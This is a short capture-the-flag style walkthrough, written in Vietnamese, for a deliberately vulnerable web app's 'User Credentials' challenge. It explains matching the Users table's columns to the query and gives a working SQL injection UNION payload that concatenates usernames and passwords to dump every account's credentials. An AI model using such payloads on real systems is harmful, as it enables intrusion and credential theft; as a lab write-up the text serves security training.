# User Credentials

- **Vulnerability**: Injection
- **Difficult Level**: 4/6
- **Description**: Retrieve a list of all user credentials via SQL Injection.

---
Các bước lấy schema tương tự như challenge Database Schema.

Khi có được schema rồi ta tìm kiếm bảng chứa username và password:

<img width="1029" height="529" alt="image" src="https://github.com/user-attachments/assets/6b4dfd87-2ea8-4b28-8a6b-c165e64fc7fe" />

Để ý thì bảng User có 12 cột, trong khi bảng hiện tại truy vấn chỉ có 9 cột => Phải sử dụng phép nối chuỗi.
Ta tạo payload khác:
```
1'))+UNION+SELECT+id,username||':'||password,email,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive+FROM+Users--
```

<img width="1026" height="526" alt="image" src="https://github.com/user-attachments/assets/27ebf468-00c1-4f96-8608-12f715acde8e" />


Quay lại proxy gửi request là xong challenge.
